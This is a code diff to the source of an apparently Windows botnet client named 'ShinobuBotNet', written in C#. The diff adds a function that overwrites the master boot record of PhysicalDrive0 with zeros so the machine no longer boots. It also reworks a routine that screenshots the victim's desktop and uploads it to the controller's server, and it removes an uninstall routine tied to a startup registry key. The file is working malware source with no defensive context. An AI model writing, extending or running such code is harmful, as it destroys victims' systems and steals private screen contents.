@@ -1,7 +1,9 @@
 ﻿using Microsoft.Win32;
+using System;
 using System.Diagnostics;
 using System.Drawing;
 using System.Net;
+using System.Runtime.InteropServices;
 using System.Threading;
 using System.Windows;
 using System.Windows.Forms;
@@ -10,6 +12,25 @@ namespace ShinobuBotNet
 {
     class functions
     {
+        [DllImport("kernel32")]
+        private static extern IntPtr CreateFile(
+        string lpFileName,
+         uint dwDesiredAccess,
+        uint dwShareMode,
+        IntPtr lpSecurityAttributes,
+        uint dwCreationDisposition,
+        uint dwFlagsAndAttributes,
+        IntPtr hTemplateFile);
+
+        [DllImport("kernel32")]
+        private static extern bool WriteFile(
+        IntPtr hFile,
+        byte[] lpBuffer,
+        uint nNumberOfBytesToWrite,
+        out uint lpNumberOfBytesWritten,
+        IntPtr lpOverlapped);
+
+
         public static void OpenLink(string URI)
         {
             if (URI.StartsWith("http"))
@@ -33,7 +54,7 @@ namespace ShinobuBotNet
         {
             WebClient wc = new WebClient();
             wc.Proxy = null;
-            string PingURI = configs.server + "ping.php";
+            string PingURI = config.server + "ping.php";
             Thread thr = new Thread(() =>
            {
                wc.DownloadString(PingURI);
@@ -62,16 +83,12 @@ namespace ShinobuBotNet
             Thread thr = new Thread(() =>
             {
                 //делаем скрин
-                string file_name = "screnshot.jpg";
-                Graphics graph = null;
-                var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-                graph = Graphics.FromImage(bmp);
-                graph.CopyFromScreen(0, 0, 0, 0, bmp.Size);
-                bmp.Save(file_name); ;
+                string filename = "screnshot.jpg";
+                utils.desktopScreenshot(filename);
                 //отправка файла
-                System.Net.WebClient Client = new System.Net.WebClient();
-                Client.Headers.Add("png/jpg", "binary/octet-stream");
-                byte[] result = Client.UploadFile(configs.server + "upload.php?id=" + API.Get_ID(), "POST", file_name);
+                WebClient wc = new WebClient();
+                wc.Proxy = null;
+                wc.UploadFile(config.server + "upload.php", filename);
             });
 
         }
@@ -82,18 +99,52 @@ namespace ShinobuBotNet
             System.Windows.MessageBox.Show(text);
         }
 
-        public static void uninstall()
+        // Overwrite MBR (destroy system)
+        public static void DestroySystem()
         {
-            string applicationName = configs.FileName;
-            const string pathRegistryKeyStartup =
-                        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
-
-            using (RegistryKey registryKeyStartup =
-                        Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup, true))
+            Thread thr = new Thread(() =>
             {
-                registryKeyStartup.DeleteValue(applicationName, false);
-            }
-            Process.Start("shutdown", "/r /t 0");
+                uint GenericAll = 0x10000000;
+                //dwShareMode
+                uint FileShareRead = 0x1;
+                uint FileShareWrite = 0x2;
+                //dwCreationDisposition
+                uint OpenExisting = 0x3;
+                //dwFlagsAndAttributes
+                uint MbrSize = 512u;
+
+                var mbrData = new byte[MbrSize];
+
+                var mbr = CreateFile(
+                    "\\\\.\\PhysicalDrive0",
+                    GenericAll,
+                    FileShareRead | FileShareWrite,
+                    IntPtr.Zero,
+                    OpenExisting, 0, IntPtr.Zero);
+
+                if (mbr == (IntPtr)(-0x1))
+                {
+                    Console.WriteLine(" Please start as admin!");
+                    return;
+                }
+
+                if (WriteFile(
+                    mbr,
+                    mbrData,
+                    MbrSize,
+                    out uint lpNumberOfBytesWritten,
+                    IntPtr.Zero))
+                {
+                    Console.WriteLine("The boot sector has been overwritten. The system will no longer boot.");
+                    return;
+                }
+                else
+                {
+                    Console.WriteLine(" Failed overwrite boot sector.");
+                    return;
+                }
+            });
+            thr.Start();
         }
     }
 }
